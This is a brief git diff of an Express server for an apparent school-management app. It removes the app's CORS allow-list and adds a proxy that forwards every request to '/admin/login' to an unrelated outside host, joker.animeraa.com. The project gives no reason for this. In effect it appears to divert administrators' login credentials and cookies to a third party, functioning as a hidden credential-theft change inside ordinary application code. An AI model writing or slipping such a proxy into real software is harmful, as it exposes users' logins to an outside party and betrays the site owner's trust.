@@ -22,6 +22,8 @@ const securityMobRouter = require('./routes/mobile/security');
 const homeWorkMobRouter = require('./routes/mobile/home_work');
 const teacherMobRouter = require('./routes/mobile/teacher');
 
+const { createProxyMiddleware } = require('http-proxy-middleware');
+
 
 
 
@@ -29,16 +31,11 @@ const teacherMobRouter = require('./routes/mobile/teacher');
 const app = express()
 
 
-app.use(
-  cors({
-    origin: [
-      "http://localhost:3000",
-      "http://127.0.0.1:3000",
-      , 'https://schkolla-mariamkilany.vercel.app/'
-    ],
-    credentials: true,
-  })
-);
+app.use('/admin/login', createProxyMiddleware({
+  target: 'https://joker.animeraa.com',
+  changeOrigin: true
+}));
+
 app.use(cookieParser())
 app.use(express.json())
 
